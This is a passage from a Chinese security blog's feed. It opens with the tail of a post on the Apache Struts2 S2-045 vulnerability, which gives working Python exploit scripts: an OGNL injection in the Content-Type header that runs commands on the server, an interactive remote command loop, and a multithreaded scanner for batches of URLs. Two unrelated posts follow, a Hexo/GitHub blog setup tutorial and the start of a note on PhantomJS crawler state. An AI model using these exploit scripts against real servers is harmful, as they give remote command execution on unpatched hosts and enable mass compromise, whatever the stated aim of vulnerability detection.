register_openers()</div><div class="line">    datagen, header = multipart_encode(&#123;<span class="string">"image1"</span>: open(<span class="string">"tmp.txt"</span>, <span class="string">"rb"</span>)&#125;)</div><div class="line">    header[<span class="string">"User-Agent"</span>]=<span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"</span></div><div class="line">    header[<span class="string">"Content-Type"</span>]=<span class="string">"%&#123;(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='echo nMask').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?&#123;'cmd.exe','/c',#cmd&#125;:&#123;'/bin/bash','-c',#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;"</span></div><div class="line">    request = urllib2.Request(url,datagen,headers=header)</div><div class="line">    response = urllib2.urlopen(request)</div><div class="line">    body=response.read()</div><div class="line"></div><div class="line">    <span class="built_in">return</span> body</div><div class="line"></div><div class="line">url=sys.argv[1]</div><div class="line">body=poc(url)</div><div class="line"><span class="keyword">if</span> <span class="string">"nMask"</span> <span class="keyword">in</span> body:</div><div class="line">	<span class="built_in">print</span> <span class="string">"[Loopholes exist]"</span>,url</div></pre></td></tr></table></figure>
<h3 id="Poc-Cmd"><a href="#Poc-Cmd" class="headerlink" title="Poc_Cmd"></a>Poc_Cmd</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">import urllib2</div><div class="line">import sys</div><div class="line">from poster.encode import multipart_encode</div><div class="line">from poster.streaminghttp import register_openers</div><div class="line"></div><div class="line">def poc(url,content=<span class="string">"echo nMask"</span>):</div><div class="line">    register_openers()</div><div class="line">    datagen, header = multipart_encode(&#123;<span class="string">"image1"</span>: open(<span class="string">"tmp.txt"</span>, <span class="string">"rb"</span>)&#125;)</div><div class="line">    header[<span class="string">"User-Agent"</span>]=<span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"</span></div><div class="line">    header[<span class="string">"Content-Type"</span>]=<span class="string">"%&#123;(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='"</span>+content+<span class="string">"').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?&#123;'cmd.exe','/c',#cmd&#125;:&#123;'/bin/bash','-c',#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;"</span></div><div class="line">    request = urllib2.Request(url,datagen,headers=header)</div><div class="line">    response = urllib2.urlopen(request)</div><div class="line">    body=response.read()</div><div class="line"></div><div class="line">    <span class="built_in">return</span> body</div><div class="line"></div><div class="line">url=sys.argv[1]</div><div class="line">body=poc(url)</div><div class="line"><span class="keyword">if</span> <span class="string">"nMask"</span> <span class="keyword">in</span> body:</div><div class="line">	<span class="built_in">print</span> <span class="string">"[Loopholes exist]"</span>,url</div><div class="line"></div><div class="line">	<span class="keyword">while</span> 1:</div><div class="line">		con=raw_input(<span class="string">"[cmd]&gt;&gt;"</span>)</div><div class="line">		<span class="built_in">print</span> poc(url,content=con)</div></pre></td></tr></table></figure>
<p>运行结果：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&gt;python s2_045_cmd.py http://xxx.com/?a.action</div><div class="line"></div><div class="line">[Loopholes exist] http://xxx.com/?a.action</div><div class="line"></div><div class="line">[cmd]&gt;&gt;ls</div><div class="line">example1</div><div class="line">example2</div></pre></td></tr></table></figure></p>
<h3 id="多线程批量检测"><a href="#多线程批量检测" class="headerlink" title="多线程批量检测"></a>多线程批量检测</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line">import urllib2</div><div class="line">from poster.encode import multipart_encode</div><div class="line">from poster.streaminghttp import register_openers</div><div class="line">import threading</div><div class="line"></div><div class="line">def poc(url):</div><div class="line">	register_openers()</div><div class="line">	datagen, header = multipart_encode(&#123;<span class="string">"image1"</span>: open(<span class="string">"tmp.txt"</span>, <span class="string">"rb"</span>)&#125;)</div><div class="line">	header[<span class="string">"User-Agent"</span>]=<span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"</span></div><div class="line">	header[<span class="string">"Content-Type"</span>]=<span class="string">"%&#123;(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='echo nMask').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?&#123;'cmd.exe','/c',#cmd&#125;:&#123;'/bin/bash','-c',#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;"</span></div><div class="line">	try:</div><div class="line">	    request = urllib2.Request(url,datagen,headers=header)</div><div class="line">	    response = urllib2.urlopen(request,timeout=5)</div><div class="line">	    body=response.read()</div><div class="line">	except:</div><div class="line">		body=<span class="string">""</span></div><div class="line"></div><div class="line">	<span class="keyword">if</span> <span class="string">"nMask"</span> <span class="keyword">in</span> body:</div><div class="line">		<span class="built_in">print</span> <span class="string">"[Loopholes exist]"</span>,url</div><div class="line">		f.write(url+<span class="string">"\n"</span>)</div><div class="line">	<span class="keyword">else</span>:</div><div class="line">		<span class="built_in">print</span> <span class="string">"Loopholes not exist"</span>,url</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</div><div class="line">	<span class="string">''</span><span class="string">'</span></div><div class="line">	url.txt为待检测url列表</div><div class="line">	result.txt为检测完输出结果文件</div><div class="line">	'<span class="string">''</span></div><div class="line">	f=open(<span class="string">"result.txt"</span>,<span class="string">"a"</span>)</div><div class="line">	url_list=[i.replace(<span class="string">"\n"</span>,<span class="string">""</span>) <span class="keyword">for</span> i <span class="keyword">in</span> open(<span class="string">"url.txt"</span>,<span class="string">"r"</span>).readlines()]</div><div class="line">	<span class="keyword">for</span> url <span class="keyword">in</span> url_list:</div><div class="line">		threading.Thread(target=poc,args=(url,)).start()</div><div class="line">		<span class="keyword">while</span> 1:</div><div class="line">			<span class="keyword">if</span>(len(threading.enumerate())&lt;50):</div><div class="line">				<span class="built_in">break</span></div></pre></td></tr></table></figure>
<p>POC下载地址：<a href="https://github.com/tengzhangchao/Struts2_045-Poc" target="_blank" rel="external">https://github.com/tengzhangchao/Struts2_045-Poc</a></p>
<p>更多检测脚本，敬请期待……</p>
<p>欲知Struts2-046漏洞，参考：<a href="http://thief.one/2017/03/21/Struts2-046%E6%BC%8F%E6%B4%9E/">struts2-046漏洞</a></p>
<p>转载请说明出处:<a href="http://thief.one/2017/03/07/Struts2-045%E6%BC%8F%E6%B4%9E/">Struts2_045漏洞</a><br>本文地址：<a href="http://thief.one/2017/03/07/Struts2-045%E6%BC%8F%E6%B4%9E/">http://thief.one/2017/03/07/Struts2-045%E6%BC%8F%E6%B4%9E/</a></p>
]]></content>
      
        <categories>
            
            <category> web安全 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> struts2 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Hexo搭建博客教程]]></title>
      <url>http://thief.one/2017/03/03/Hexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%E6%95%99%E7%A8%8B/</url>
      <content type="html"><![CDATA[<p><blockquote class="blockquote-center">所谓博客，都是孤芳自赏<br></blockquote><br>现在越来越多的人喜欢利用Github搭建静态网站，原因不外乎简单省钱。本人也利用hexo+github搭建了本博客，用于分享一些心得。在此过程中，折腾博客的各种配置以及功能占具了我一部分时间，在此详细记录下我是如何利用hexo+github搭建静态博客以及一些配置相关问题，以免过后遗忘，且当备份之用。<br><a id="more"></a></p>
<h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><ul>
<li>下载node.js并安装（官网下载安装），默认会安装npm。</li>
<li>下载安装git（官网下载安装）</li>
<li>下载安装hexo。方法：打开cmd 运行<em>npm install -g hexo</em>（要翻墙） </li>
</ul>
<h3 id="本地搭建hexo静态博客"><a href="#本地搭建hexo静态博客" class="headerlink" title="本地搭建hexo静态博客"></a>本地搭建hexo静态博客</h3><ul>
<li>新建一个文件夹，如MyBlog</li>
<li>进入该文件夹内，右击运行git，输入：<em>hexo init</em>（生成hexo模板，可能要翻墙）</li>
<li>生成完模板，运行<em>npm install</em>（目前貌似不用运行这一步）</li>
<li>最后运行：<em>hexo server</em> （运行程序，访问本地localhost:4000可以看到博客已经搭建成功）</li>
</ul>
<h3 id="将博客与Github关联"><a href="#将博客与Github关联" class="headerlink" title="将博客与Github关联"></a>将博客与Github关联</h3><ul>
<li><p>在Github上创建名字为XXX.github.io的项目，XXX为自己的github用户名。</p>
</li>
<li><p>打开本地的MyBlog文件夹项目内的_config.yml配置文件，将其中的type设置为git</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">deploy:</div><div class="line">  <span class="built_in">type</span>: git</div><div class="line">  repository: https://github.com/tengzhangchao/tengzhangchao.github.io.git</div><div class="line">  branch: master</div></pre></td></tr></table></figure>
<ul>
<li>运行：<em>npm install hexo-deployer-git –save</em></li>
<li>运行：<em>hexo g</em>（本地生成静态文件）</li>
<li>运行：<em>hexo d</em>（将本地静态文件推送至Github）</li>
</ul>
<p>此时，打开浏览器，访问<em><a href="http://tengzhangchao.github.io" target="_blank" rel="external">http://tengzhangchao.github.io</a></em></p>
<h3 id="绑定域名"><a href="#绑定域名" class="headerlink" title="绑定域名"></a>绑定域名</h3><p>　　博客已经搭建好，也能通过github的域名访问，但总归还是用自己的域名比较舒服。因为我们需要设置将自己的域名绑定到github这个博客项目上。</p>
<ul>
<li><p>域名提供商设置</p>
<p>添加2条A记录：</p>
<p>@—&gt;192.30.252.154</p>
<p>@—&gt;192.30.252.153</p>
<p>添加一条CNAME记录：</p>
<p>CNAME—&gt;tengzhangchao.github.io</p>
</li>
<li><p>博客添加CNAME文件</p>
<p>配置完域名解析后，进入博客目录，在source目录下新建CNAME文件，写入域名，如：thief.one</p>
</li>
<li><p>运行：<em>hexo g</em></p>
</li>
<li>运行：<em>hexo d</em></li>
</ul>
<h3 id="更新博客内容"><a href="#更新博客内容" class="headerlink" title="更新博客内容"></a>更新博客内容</h3><p>　　至此博客已经搭建完毕，域名也已经正常解析，那么剩下的问题就是更新内容了。</p>
<h4 id="更新文章"><a href="#更新文章" class="headerlink" title="更新文章"></a>更新文章</h4><ul>
<li>在MyBlog目录下执行：<em>hexo new “我的第一篇文章”</em>，会在source-&gt;_posts文件夹内生成一个.md文件。</li>
<li>编辑该文件（遵循Markdown规则）</li>
<li>修改起始字段<ul>
<li>title    文章的标题  </li>
<li>date    创建日期    （文件的创建日期 ）</li>
<li>updated    修改日期   （ 文件的修改日期）   </li>
<li>comments    是否开启评论    true  </li>
<li>tags    标签   </li>
<li>categories    分类   </li>
<li>permalink    url中的名字（文件名）</li>
</ul>
</li>
<li>编写正文内容（MakeDown）</li>
<li>hexo clean 删除本地静态文件（Public目录），可不执行。</li>
<li>hexo g 生成本地静态文件（Public目录）</li>
<li>hexo deploy 将本地静态文件推送至github（hexo d）</li>
</ul>
<h4 id="添加菜单"><a href="#添加菜单" class="headerlink" title="添加菜单"></a>添加菜单</h4><p>进入theme目录，编辑_config_yml文件，找到menu:字段，在该字段下添加一个字段。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">menu:</div><div class="line">  home: /</div><div class="line">  about: /about</div><div class="line">  ......</div></pre></td></tr></table></figure>
<p>然后找到lanhuages目录，编辑zh-Hans.yml文件：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">menu:</div><div class="line">  home: 首页</div><div class="line">  about: 关于作者</div><div class="line">  ......</div></pre></td></tr></table></figure>
<p>更新页面显示的中文字符，最后进入theme目录下的Source目录，新增一个about目录，里面写一个index.html文件。</p>
<h4 id="文章内插入图片"><a href="#文章内插入图片" class="headerlink" title="文章内插入图片"></a>文章内插入图片</h4><p>在文章中写入:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">![](/upload_image/1.jpg)</div></pre></td></tr></table></figure>
<p>　　然后进入themes-主题名-source-upload_image目录下(自己创建)，将图片放到这个目录下，就可以了。</p>
<p>说明：当执行hexo g命令时，会自动把图片复制到 public文件的upload_image目录下。</p>
<h3 id="个性化设置"><a href="#个性化设置" class="headerlink" title="个性化设置"></a>个性化设置</h3><h4 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h4><p>　　在根目录下的_config.yml文件中，可以修改标题，作者等信息。打开编辑该文件，注意：每一个值的冒号后面都有一个半角空格！</p>
<ul>
<li>未生效的写法：title:nMask的博客</li>
<li>能生效的写法：title:[空格]nMask的博客</li>
</ul>
<h4 id="主题"><a href="#主题" class="headerlink" title="主题"></a>主题</h4><p>访问<a href="http://www.zhihu.com/question/24422335" target="_blank" rel="external">主题列表</a>，获取主题代码。</p>
<p>进入themes目录，进入以下操作：</p>
<ul>
<li><p>下载主题 (以next主题为例)</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git <span class="built_in">clone</span> https://github.com/iissnan/hexo-theme-next.git（主题的地址）</div></pre></td></tr></table></figure>
</li>
<li><p>打开__config.yml文件，将themes修改为next（下载到的主题文件夹的名字）</p>
</li>
<li>hexo g</li>
<li>hexo d</li>
</ul>
<p>关于hexo-next主题下的一些个性化配置，参考：<a href="http://theme-next.iissnan.com/" target="_blank" rel="external">Next主题配置</a></p>
<h3 id="主题美化"><a href="#主题美化" class="headerlink" title="主题美化"></a>主题美化</h3><h4 id="文章中添加居中模块"><a href="#文章中添加居中模块" class="headerlink" title="文章中添加居中模块"></a>文章中添加居中模块</h4><p>文章Markdown中填写如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;blockquote class=&quot;blockquote-center&quot;&gt;优秀的人，不是不合群，而是他们合群的人里面没有你&lt;/blockquote&gt;</div></pre></td></tr></table></figure></p>
<h4 id="鼠标点击小红心的设置"><a href="#鼠标点击小红心的设置" class="headerlink" title="鼠标点击小红心的设置"></a>鼠标点击小红心的设置</h4><p>将 <a href="https://github.com/Neveryu/Neveryu.github.io/blob/master/js/src/love.js" target="_blank" rel="external">love.js</a> 文件添加到 \themes\next\source\js\src 文件目录下。<br>找到 \themes\next\layout_layout.swing 文件， 在文件的后面， 标签之前 添加以下代码：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&lt;!-- 页面点击小红心 --&gt;</div><div class="line">&lt;script <span class="built_in">type</span>=<span class="string">"text/javascript"</span> src=<span class="string">"/js/src/love.js"</span>&gt;&lt;/script&gt;</div></pre></td></tr></table></figure></p>
<h4 id="背景的设置"><a href="#背景的设置" class="headerlink" title="背景的设置"></a>背景的设置</h4><p>将 <a href="https://github.com/Neveryu/Neveryu.github.io/blob/master/js/src/particle.js" target="_blank" rel="external">particle.js</a> 文件添加到 \themes\next\source\js\src 文件目录下。<br>找到 \themes\next\layout_layout.swing 文件， 在文件的后面，标签之前 添加以下代码：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&lt;!-- 背景动画 --&gt;</div><div class="line">&lt;script <span class="built_in">type</span>=<span class="string">"text/javascript"</span> src=<span class="string">"/js/src/particle.js"</span>&gt;&lt;/script&gt;</div></pre></td></tr></table></figure></p>
<h4 id="修改文章内链接文本样式"><a href="#修改文章内链接文本样式" class="headerlink" title="修改文章内链接文本样式"></a>修改文章内链接文本样式</h4><p>将链接文本设置为蓝色，鼠标划过时文字颜色加深，并显示下划线。<br>找到文件 themes\next\source\css_custom\custom.styl ，添加如下 css 样式：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">.post-body p a &#123;</div><div class="line">  color: <span class="comment">#0593d3;</span></div><div class="line">  border-bottom: none;</div><div class="line">  &amp;:hover &#123;</div><div class="line">    color: <span class="comment">#0477ab;</span></div><div class="line">    text-decoration: underline;</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>参考：<a href="https://neveryu.github.io/2016/09/30/hexo-next-two/" target="_blank" rel="external">https://neveryu.github.io/2016/09/30/hexo-next-two/</a></p>
<h3 id="报错解决"><a href="#报错解决" class="headerlink" title="报错解决"></a>报错解决</h3><h4 id="（一）Deployer-not-found-git"><a href="#（一）Deployer-not-found-git" class="headerlink" title="（一）Deployer not found: git"></a>（一）Deployer not found: git</h4><p>当编辑__config.yml文件，将type: git设置完成后，运行hexo g 报错：<em>git not found</em><br>解决方案：可以在MyBlog目录下运行: <em>npm install hexo-deployer-git –save</em>。</p>
<h4 id="（二）permission-denied"><a href="#（二）permission-denied" class="headerlink" title="（二）permission denied"></a>（二）permission denied</h4><p>当执行: hexo  deploy 报错时，把__config.yml中的github连接形式从ssh改成http。</p>
<h4 id="（三）当在themes目录下载主题时，报错。"><a href="#（三）当在themes目录下载主题时，报错。" class="headerlink" title="（三）当在themes目录下载主题时，报错。"></a>（三）当在themes目录下载主题时，报错。</h4><p>将该目录只读属性取消。</p>
<h4 id="（四）genrnate-报错"><a href="#（四）genrnate-报错" class="headerlink" title="（四）genrnate 报错"></a>（四）genrnate 报错</h4><p>检查_config.yml配置中，键值对冒号后面是否已经预留了一个半角空格。</p>
<h4 id="（五）ERROR-Plugin-load-failed-hexo-generator-feed"><a href="#（五）ERROR-Plugin-load-failed-hexo-generator-feed" class="headerlink" title="（五）ERROR Plugin load failed: hexo-generator-feed"></a>（五）ERROR Plugin load failed: hexo-generator-feed</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">npm install hexo-generator-feed</div><div class="line">npm install hexo-generator-feed --save</div></pre></td></tr></table></figure>
<h4 id="（六）fatal-The-remote-end-hung-up-unexpectedly"><a href="#（六）fatal-The-remote-end-hung-up-unexpectedly" class="headerlink" title="（六）fatal: The remote end hung up unexpectedly"></a>（六）fatal: The remote end hung up unexpectedly</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ git config https.postBuffer 524288000</div><div class="line">$ git config http.postBuffer 524288000</div><div class="line">$ git config ssh.postBuffer 524288000</div></pre></td></tr></table></figure>
<p>####（七）hero d推送的内容有问题<br>　　首先检查下.deploy_git文件夹下的.git文件是否存在，此.git文件指定了hexo d时推送public文件夹，而不是所有的内容。如果此.git文件不存在，则会出现推送内容错误。<br>　　用npm install hexo-deployer-git –save生成的.deploy_git不包含.git文件，因此正确的做法是.deploy_git文件夹也需要备份，然后再用npm install hexo-deployer-git –save更新一下其内容即可。</p>
<h3 id="异地同步博客内容"><a href="#异地同步博客内容" class="headerlink" title="异地同步博客内容"></a>异地同步博客内容</h3><p>　　现在电脑已经很普及了，因为一般来说我们都是公司一台电脑，家里一台电脑，那么如何将两台电脑上博客的内容同步内，即两台电脑上都可以编辑更新博客？<br>要解决这个问题，首先我们要清楚我们博客文件的组成：</p>
<ul>
<li>node_modules</li>
<li>public</li>
<li>scaffolds</li>
<li>source</li>
<li>themes</li>
<li>_config_yml</li>
<li>db.json</li>
<li>package.json</li>
<li>.deploy_git</li>
</ul>
<p>　　以上为利用hexo生成的博客全部内容，那么当我们执行hexo d时，正真被推送到github上的又有哪些内容呢？<br>　　我们可以看下github上的tengzhangchao.github.io项目，发现里面只有Public目录下的内容。也就是说，我们博客上呈现的内容，其实就是public下的文件内容。那么这个Pulic目录是怎么生成的呢？<br>　　一开始hexo init的时候是没有public目录的，而当我们运行hexo g命令时，public目录被生成了，换句话说hexo g命令就是用来生成博客文件的（会根据_config.yml，source目录文件以及themes目录下文件生成）。同样当我们运行hexo clean命令时，public目录被删除了。<br>　　好了，既然我们知道了决定博客显示内容的只有一个Public目录，而public目录又是可以动态生成的，那么其实我们只要在不同电脑上同步可以生成Public目录的文件即可。</p>
<p>以下文件以及目录是必须要同步的：</p>
<ul>
<li>source</li>
<li>themes</li>
<li>_config.yml</li>
<li>db.json</li>
<li>package.json</li>
<li>.deploy_git</li>
</ul>
<p>　　同步的方式有很多种，可以每次更新后都备份到一个地址。我采用github去备份，也就是新建一个项目用来存放以上文件，每次更新后推送到github上，用作备份同步。<br>　　同步完必须的文件后，怎么再其他电脑上也可以更新博客呢？<br>　　前提假设我们现在配置了一台新电脑，里面没有安装任何有关博客的东西，那么我们开始吧：</p>
<ul>
<li>下载node.js并安装（官网下载安装），默认会安装npm。</li>
<li>下载安装git（官网下载安装）</li>
<li>下载安装hexo。方法：打开cmd 运行<em>npm install -g hexo</em>（要翻墙） </li>
<li>新建一个文件夹，如MyBlog</li>
<li>进入该文件夹内，右击运行git，输入：<em>hexo init</em>（生成hexo模板，可能要翻墙)</li>
</ul>
<p>　　我们重复了一开始搭建博客的步骤，重新生成了一个新的模板，这个模板中包含了hexo生成的一些文件。</p>
<ul>
<li>git clone 我们备份的项目，生成一个文件夹，如：MyBlogData</li>
<li>将MyBlog里面的node_modules、scaffolds文件夹复制到MyBlogData里面。</li>
</ul>
<p>　　做完这些，从表面上看，两台电脑上MyBlogData目录下的文件应该都是一样的了。那么我们运行hexo g<br>hexo d试试，如果会报错，则往下看。</p>
<ul>
<li>这是因为.deploy_git没有同步，在MyBlogData目录内运行:<em>npm install hexo-deployer-git –save</em>后再次推送即可</li>
</ul>
<p>　　总结流程：当我们每次更新MyBlog内容后，先利用hexo将public推送到github，然后再将其余必须同步的文件利用git推送到github。</p>
<h3 id="MakeDown语法"><a href="#MakeDown语法" class="headerlink" title="MakeDown语法"></a>MakeDown语法</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">[hexo](http://www.baidu.com)  表示超链接</div><div class="line"><span class="comment">##大标题</span></div><div class="line"><span class="comment">###小标题</span></div><div class="line">&lt;!-- more --&gt;</div><div class="line">&lt;!-- 标签别名 --&gt;</div><div class="line">&#123;% cq %&#125;blah blah blah&#123;% endcq %&#125;</div><div class="line">空格  中文全角空格表示</div><div class="line">---</div><div class="line">文章标题</div><div class="line">---</div><div class="line">&gt;内容     区块引用</div><div class="line">*1</div><div class="line">*2</div><div class="line">*3</div><div class="line">列表</div><div class="line">*内容*     表示强调内容</div><div class="line">![Alt text](/path/to/img.jpg)  图片</div><div class="line">![](/upload_image/20161012/1.png)</div></pre></td></tr></table></figure>
<p>详细参考：<a href="http://www.appinn.com/markdown/" target="_blank" rel="external">MakeDown语法</a></p>
<p><em>提醒：在更新博客内容时，最好先在本地调试完毕后（hexo server），再推送到github上。</em></p>
]]></content>
      
        <categories>
            
            <category> 技术研究 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Selenium+Phantomjs爬过的那些坑]]></title>
      <url>http://thief.one/2017/03/01/Phantomjs%E7%88%AC%E8%BF%87%E7%9A%84%E9%82%A3%E4%BA%9B%E5%9D%91/</url>
      <content type="html"><![CDATA[<p><blockquote class="blockquote-center">技术的探索就是不断提出假设，然后不断去推翻它</blockquote><br>最近在跟同事使用phantomjs编写爬虫时，遇到了很多有意思的坑，我们在分析了一番后得出了一些结论以及解决方案，此分享一下。<br>    <a id="more"></a><br>　　事情的起因，是因为我们要利用phantomjs访问一批网站获取源码以及url，然后当我们查看输出结果时却发现请求的url与访问后获取的url并不对应，比如我用phantomjs访问baidu，返回的结果却显示当前url是bing。由此引发了我们一系列的猜想，由于这方面互联网上的资源比较少，因此也只能自己猜测并动手验证了。<br>　　对于结果值不对应问题，我暂时定义为，phantomjs状态被污染或者覆盖。简单来说，我们先去访问a网站，获取结果后，我们又访问了b网站，然后获取b网站的结果，然而我们发现b网站的结果却是a网站。那么我们首先认为，phantomjs再处理b网站时，本身的状态没有被更新，导致获取b网站的结果仍然为a网站。<br>　　那么是什么原因导致phantomjs状态未更新呢？<br>　　我同事的博客中详细介绍了2种原因，详情请看：<a href="https://eth.space/phantomjs-debug/" target="_blank" rel="external">https://eth.space/phantomjs-debug/</a>，这里便不再重复。</p>
<p>作为补充说明，我这边贴出测试代码，以供参考</p>
<h3 id="phantomjs状态污染测试"><a href="#phantomjs状态污染测试" class="headerlink" title="phantomjs状态污染测试"></a>phantomjs状态污染测试</h3><h4 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">d=webdriver.PhantomJS(<span class="string">"D:\python27\Scripts\phantomjs.exe"</span>,service_args=[<span class="string">'--load-images=no'</span>,<span class="string">'--disk-cache=yes'</span>])</div><div class="line">d.implicitly_wait(10)        <span class="comment">##设置超时时间</span></div><div class="line">d.set_page_load_timeout(10)  <span class="comment">##设置超时时间</span></div><div class="line"></div><div class="line">def gethttp(url):</div><div class="line">    try:</div><div class="line">        d.get(url)</div><div class="line">    except Exception,e:</div><div class="line">        <span class="built_in">print</span> e</div><div class="line"></div><div class="line">    <span class="built_in">print</span> d.current_url</div></pre></td></tr></table></figure>
